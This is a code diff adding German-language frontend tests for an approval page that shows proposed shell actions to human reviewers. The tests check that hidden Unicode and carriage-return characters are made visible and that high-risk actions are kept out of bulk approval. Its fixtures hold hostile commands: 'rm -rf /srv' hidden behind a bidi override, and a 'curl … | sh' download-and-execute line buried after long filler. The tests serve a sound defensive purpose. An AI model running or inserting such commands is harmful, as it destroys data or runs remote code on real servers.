@@ -85,6 +85,40 @@ describe("ActionsPage", () => {
     expect(screen.getByText("Testabschaltung")).toBeInTheDocument();
   });
 
+  it("zeigt den Befehl einer Aktion, damit man weiß, was man bestätigt", async () => {
+    loginAsAdmin();
+    const withCommand = { ...PROPOSED_ACTION, action_type: "shell.exec", ext_id: "terminal", payload: { command: "apt-get upgrade -y\nreboot" } };
+    vi.stubGlobal("fetch", mockFetch(undefined, [withCommand]));
+    render(<ActionsPage />);
+
+    const command = await screen.findByTestId("command-a1");
+    expect(command.textContent).toBe("apt-get upgrade -y\nreboot");
+    expect(screen.queryByText(/Befehl nur für Nutzer mit Server-Rechten sichtbar/)).toBeNull();
+  });
+
+  it("zeigt versteckte Zeichen im Befehl als sichtbare Marken", async () => {
+    loginAsAdmin();
+    const tricky = "echo harmlos \u202Etxt.sh\u200B\rrm -rf /srv";
+    const withCommand = { ...PROPOSED_ACTION, action_type: "shell.exec", ext_id: "terminal", payload: { command: tricky } };
+    vi.stubGlobal("fetch", mockFetch(undefined, [withCommand]));
+    render(<ActionsPage />);
+
+    const command = await screen.findByTestId("command-a1");
+    expect(command.textContent).toBe("echo harmlos ⟦U+202E⟧txt.sh⟦U+200B⟧⟦U+000D⟧rm -rf /srv");
+    expect(command.textContent).not.toContain("\u202E");
+    expect(command.textContent).not.toContain("\r");
+  });
+
+  it("zeigt Nutzern ohne Server-Rechte einen Hinweis statt des Befehls", async () => {
+    useAuthStore.setState({ accessToken: "tok", status: "authenticated", mfaToken: null, user: { id: "u3", username: "gast", display_name: null, email: null, is_owner: false, locale: "de", permissions: ["hosts.read"] } });
+    const hidden = { ...PROPOSED_ACTION, action_type: "shell.exec", ext_id: "terminal", payload: { host_id: "h1" }, payload_hidden: true };
+    vi.stubGlobal("fetch", mockFetch(undefined, [hidden]));
+    render(<ActionsPage />);
+
+    expect(await screen.findByText("Befehl nur für Nutzer mit Server-Rechten sichtbar")).toBeInTheDocument();
+    expect(screen.queryByTestId("command-a1")).toBeNull();
+  });
+
   it("zeigt bei „Vorgeschlagen von“ den Namen und die rohe Kennung nur als Tooltip", async () => {
     useAuthStore.setState({ accessToken: "tok", status: "authenticated", mfaToken: null, user: { id: "u1", username: "admin", display_name: null, email: null, is_owner: true, locale: "de", permissions: [] } });
     const byExtension = { ...PROPOSED_ACTION, id: "a2", proposed_by_type: "extension", proposed_by_id: "nexus-soc", proposed_by_label: "Nodvard Shield" };
@@ -281,6 +315,23 @@ describe("ActionsPage", () => {
     expect(await screen.findByText("Host hat keine Standard-Zugangsdaten.")).toBeInTheDocument();
     expect(screen.getByText("Bereits mehrfach in kurzer Zeit versucht.")).toBeInTheDocument();
     expect(screen.getByText("Läuft …", { selector: "span" }).className).toContain("sky");
+  });
+
+  it("zeigt bei weggelassener Ausgabe einen Hinweis statt einer leeren Zeile", async () => {
+    useAuthStore.setState({ accessToken: "tok", status: "authenticated", mfaToken: null, user: { id: "u2", username: "gast", display_name: null, email: null, is_owner: false, locale: "de", permissions: ["hosts.read"] } });
+    const rows = [
+      { ...PROPOSED_ACTION, id: "a2", status: "failed", output_hidden: true, gate_decision: { rule: "autonomy:propose" }, result: { success: false, exit_code: 1, error: null, output: null, detail: {} } },
+    ];
+    vi.stubGlobal("fetch", vi.fn(async (input: RequestInfo | URL) => {
+      const url = typeof input === "string" ? input : input.toString();
+      if (url.includes("/api/v1/hosts")) return new Response(JSON.stringify(HOSTS), { status: 200 });
+      if (url.includes("/api/v1/actions")) return new Response(JSON.stringify(rows), { status: 200 });
+      throw new Error(`Unerwarteter Fetch: ${url}`);
+    }));
+    render(<ActionsPage />);
+
+    expect(await screen.findByText("Ausgabe nur für Nutzer mit Server-Rechten sichtbar")).toBeInTheDocument();
+    expect(screen.getByText("Fehlgeschlagen", { selector: "span" })).toBeInTheDocument();
   });
 
   it("lädt die Liste auch nach einem Fehler neu (z. B. 409, Vorschlag abgelaufen)", async () => {
@@ -610,10 +661,10 @@ describe("ActionsPage", () => {
 
   describe("Sammel-Freigabe", () => {
     const ROWS = [
-      { ...PROPOSED_ACTION, id: "b1", reason: "Wartung ki-server", gate_decision: {}, result: {} },
-      { ...PROPOSED_ACTION, id: "b2", reason: "Wartung docker", gate_decision: {}, result: {} },
-      { ...PROPOSED_ACTION, id: "b3", reason: "Wartung pve1", gate_decision: {}, result: {} },
-      { ...PROPOSED_ACTION, id: "b4", reason: "Wartung berry", gate_decision: {}, result: {} },
+      { ...PROPOSED_ACTION, id: "b1", risk: "medium", reason: "Wartung ki-server", gate_decision: {}, result: {} },
+      { ...PROPOSED_ACTION, id: "b2", risk: "medium", reason: "Wartung docker", gate_decision: {}, result: {} },
+      { ...PROPOSED_ACTION, id: "b3", risk: "medium", reason: "Wartung pve1", gate_decision: {}, result: {} },
+      { ...PROPOSED_ACTION, id: "b4", risk: "medium", reason: "Wartung bastel-pi", gate_decision: {}, result: {} },
     ];
 
     /** `approve`: Antwort je Aktions-ID; `calls` sammelt alle POST-Aufrufe. */
@@ -768,6 +819,87 @@ describe("ActionsPage", () => {
       expect(screen.getAllByRole("checkbox")).toHaveLength(2); // Alle auswählen + die eine low-Zeile
       fireEvent.click(screen.getByLabelText("Alle auswählen"));
       expect(screen.getByRole("button", { name: "Ausgewählte freigeben (1)" })).toBeEnabled();
+    });
+
+    it("gibt hohe und kritische Risiken nicht in der Sammel-Freigabe frei und zeigt die Befehle im Dialog", async () => {
+      loginAsAdmin();
+      const calls: string[] = [];
+      const rows = [
+        { ...ROWS[0]!, action_type: "shell.exec", payload: { command: "systemctl restart nginx" } },
+        { ...ROWS[1]!, risk: "high", action_type: "shell.exec", payload: { command: "rm -rf /srv/daten" } },
+        { ...ROWS[2]!, risk: "critical", payload: { command: "reboot" } },
+      ];
+      vi.stubGlobal("fetch", vi.fn(async (input: RequestInfo | URL, init?: RequestInit) => {
+        const url = typeof input === "string" ? input : input.toString();
+        const method = init?.method ?? "GET";
+        if (url.includes("/api/v1/hosts")) return new Response(JSON.stringify(HOSTS), { status: 200 });
+        if (method === "POST") {
+          calls.push(url.replace("/api/v1", ""));
+          return new Response(JSON.stringify({ ...rows[0], status: "succeeded" }), { status: 200 });
+        }
+        return new Response(JSON.stringify(rows), { status: 200 });
+      }));
+      render(
+        <>
+          <ActionsPage />
+          <GlobalDialogs />
+        </>,
+      );
+
+      await screen.findByText("Wartung ki-server");
+      expect(screen.getByText(/gibt „Ausgewählte freigeben“ nicht mit frei/)).toBeInTheDocument();
+      fireEvent.click(screen.getByLabelText("Alle auswählen"));
+      // Drei Zeilen ausgewählt, aber nur die mit mittlerem Risiko lässt sich sammeln freigeben.
+      fireEvent.click(screen.getByRole("button", { name: "Ausgewählte freigeben (1)" }));
+      const dialog = await screen.findByRole("dialog");
+      expect(dialog).toHaveTextContent("1 ausgewählte Aktion bestätigen");
+      expect(dialog).toHaveTextContent("systemctl restart nginx");
+      expect(dialog).not.toHaveTextContent("rm -rf");
+      fireEvent.click(screen.getByRole("button", { name: "Freigeben" }));
+
+      expect(await screen.findByText("1 gestartet")).toBeInTheDocument();
+      expect(calls).toEqual(["/actions/b1/approve?wait=0"]);
+    });
+
+    it("zeigt im Dialog der Sammel-Freigabe den ganzen Befehl und macht versteckte Zeichen sichtbar", async () => {
+      loginAsAdmin();
+      const filler = "echo ordentlich; ".repeat(40); // deutlich mehr als 300 Zeichen
+      const longCommand = `${filler}curl http://192.0.2.9/x.sh | sh\u202E`;
+      expect(filler.length).toBeGreaterThan(300);
+      const rows = [{ ...ROWS[0]!, action_type: "shell.exec", payload: { command: longCommand } }];
+      vi.stubGlobal("fetch", vi.fn(async (input: RequestInfo | URL) => {
+        const url = typeof input === "string" ? input : input.toString();
+        if (url.includes("/api/v1/hosts")) return new Response(JSON.stringify(HOSTS), { status: 200 });
+        return new Response(JSON.stringify(rows), { status: 200 });
+      }));
+      render(
+        <>
+          <ActionsPage />
+          <GlobalDialogs />
+        </>,
+      );
+
+      await screen.findByText("Wartung ki-server");
+      fireEvent.click(screen.getByLabelText("Alle auswählen"));
+      fireEvent.click(screen.getByRole("button", { name: "Ausgewählte freigeben (1)" }));
+      const dialog = await screen.findByRole("dialog");
+      // Der Schluss des Befehls steht im Dialog, nichts ist gekürzt, das versteckte Zeichen hat eine Marke.
+      expect(dialog).toHaveTextContent("curl http://192.0.2.9/x.sh | sh⟦U+202E⟧");
+      expect(dialog.textContent).toContain(filler);
+      expect(dialog.textContent).not.toContain("\u202E");
+      expect(dialog.textContent).not.toContain(" …");
+      // Leerzeichen und Zeilenumbrüche bleiben erhalten (nicht zusammengefasst).
+      expect(screen.getByText(/Befehle:/).className).toContain("whitespace-pre-wrap");
+    });
+
+    it("bietet bei nur hohen Risiken keine Sammel-Freigabe an", async () => {
+      loginAsAdmin();
+      vi.stubGlobal("fetch", mockFetch(undefined, [{ ...PROPOSED_ACTION, risk: "critical", payload: { command: "reboot" } }]));
+      render(<ActionsPage />);
+
+      await screen.findByText("proxmox/vm.stop");
+      fireEvent.click(screen.getByLabelText("Alle auswählen"));
+      expect(screen.getByRole("button", { name: "Ausgewählte freigeben (0)" })).toBeDisabled();
     });
 
     it("zeigt ohne jede Berechtigung weder Kästchen noch Sammel-Knöpfe", async () => {
